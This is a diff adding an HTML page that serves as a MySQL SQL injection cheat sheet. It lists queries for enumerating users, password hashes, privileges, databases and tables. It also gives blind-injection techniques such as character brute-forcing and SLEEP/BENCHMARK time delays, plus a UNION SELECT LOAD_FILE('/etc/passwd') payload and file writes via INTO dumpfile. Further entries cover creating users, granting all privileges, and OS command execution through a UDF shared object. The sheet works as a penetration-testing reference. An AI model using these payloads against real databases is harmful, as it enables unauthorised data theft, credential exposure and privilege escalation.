@@ -1,0 +1,195 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Queries</title>
+</head><body>Some can only be run by admin, marked by * or -priv<br/>
+<br/>
+Version 				SELECT @@version<br/>
+Comments 			SELECT 1; #comment<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT /*comment*/1;</li>
+<li style="list-style-type: none">/*! MYSQL Special SQL */ (M) </li>
+<li style="list-style-type: none">This is a special comment syntax for MySQL. It's perfect for detecting MySQL version. If you put a code into this comments it's going to execute in MySQL only. Also you can use this to execute some code only if the server is higher than supplied version. </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Current User 			SELECT user();<br/>
+					AND user() LIKE 'root<br/>
+					AND MID((user()),1,1)&gt;'m #etc etc brute<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT system_user();</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li style="list-style-type: none">				SELECT current_user,null</li>
+</ul>
+List Users* 			SELECT user FROM mysql.user; — priv<br/>
+List Password Hashes* 	SELECT host, user, password FROM mysql.user; — priv<br/>
+List Privileges* 			SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; — list user privs<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; — priv, list user privs</li>
+<li style="list-style-type: none"> SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; — list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges; — list privs on columns</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+List DBA Accounts 		SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = <ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’; # priv</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Current Database 		SELECT database()<br/>
+List Databases 			SELECT schema_name FROM information_schema.schemata; — for MySQL &gt;= v5.0<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT distinct(db) FROM mysql.db — priv</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+List Columns 			SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ <ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> AND table_schema != ‘information_schema’</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+List Tables 			SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema !<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> = ‘information_schema’</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+List Table/Column Names	PROCEDURE ANALYSE() #<a href="https://websec.wordpress.com/2009/01/26/mysql-table-and-column-names-update/">Source</a>, should get the current table and column names<ul><li style="list-style-type: none">				LIMIT (1 . . n),1 PROCEDURE ANALYSE() #Using LIMIT to get additional column names</li>
+</ul>
+Find Tables From <br/>
+Column Name 			SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table <ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> which have a column called ‘username’</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Select Nth Row 		SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Select Nth Char 		SELECT substr(‘abcd’, 3, 1); # returns c<br/>
+Bitwise AND 			SELECT 6 &amp; 2; # returns 2<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT 6 &amp; 1; # returns 0</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+ASCII Value -&gt; Char 		SELECT char(65); # returns A<br/>
+Char -&gt; ASCII Value 		SELECT ascii(‘A’); # returns 65<br/>
+Casting 				SELECT cast(’1′ AS unsigned integer);<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT cast(’123′ AS char);</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+String Concatenation 	SELECT CONCAT(‘A’,'B’); #returns AB<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT CONCAT(‘A’,'B’,'C’); # returns ABC</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+If Statement 			SELECT if(1=1,’foo’,'bar’); — returns ‘foo’<br/>
+Case Statement 		SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; # returns A<br/>
+Avoiding Quotes 		SELECT 0×414243; # returns ABC<br/>
+Time Delay 			SELECT BENCHMARK(1000000,MD5(‘A’)); #BENCHMARK(howmanytimes, do this)<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT SLEEP(5); # &gt;= 5.0.12</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Make DNS Requests 	Impossible?<br/>
+Command Execution 	If mysqld (&lt;5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into /usr/lib (or similar). The .so file should contain a User Defined Function (UDF). raptor_udf.c explains exactly how you go about this. Remember to compile for the target architecture which may or may not be the same as your attack platform.<br/>
+Local File Access 	…’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’) — priv, can only read world-readable files.<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; — priv, write to file system</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Hostname, IP Address 	SELECT @@hostname;<br/>
+Create Users* 			CREATE USER test1 IDENTIFIED BY ‘pass1′; — priv<br/>
+Delete Users *			DROP USER test1; — priv<br/>
+Make User DBA* 		GRANT ALL PRIVILEGES ON *.* TO test1@’%'; — priv<br/>
+Location of DB files 		SELECT @@datadir;<br/>
+Default/System <br/>
+Databases 			information_schema (&gt;= mysql 5.0)<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> mysql</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<br/>
+<br/>
+<b>Potentially Useful Functions</b><br/>
+MySQL Functions		MD5() MD5 Hashing<br/>
+					SHA1() SHA1 Hashing<br/>
+					PASSWORD()<br/>
+					ENCODE()<br/>
+					COMPRESS() Compress data, can be great in large binary reading in Blind SQL Injections.<br/>
+					ROW_COUNT()<br/>
+				SCHEMA()<br/>
+					VERSION() Same as @@version<br/>
+					MID() #MID extracts substring from string MID(string, start, length)</body></html>
